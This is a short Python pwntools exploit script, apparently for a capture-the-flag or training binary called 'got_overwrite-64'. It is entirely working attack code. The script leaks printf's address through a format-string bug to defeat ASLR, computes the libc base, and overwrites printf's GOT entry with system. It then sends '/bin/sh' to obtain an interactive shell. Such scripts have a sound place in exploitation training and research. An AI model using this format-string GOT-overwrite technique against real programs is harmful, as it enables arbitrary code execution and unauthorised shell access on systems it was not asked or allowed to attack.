from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
p = process()
libc = elf.libc
# libc.address = 0x00007ffff7c00000

# Leak of printf for aslr
p.sendline(flat(
    b'%7$s||||',
    elf.got['printf']
))
printf_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = printf_leak - libc.sym['printf']
p.clean()

# p.sendline(flat(
#     elf.got['printf'],
#     f'%{libc.sym["system"] - 8}c'.encode('utf-8'),
#     b'%6$n'
# ))
p.sendline(fmtstr_payload(6, {elf.got['printf']: libc.sym['system']}))
p.clean()
p.sendline(b'/bin/sh')
p.interactive()
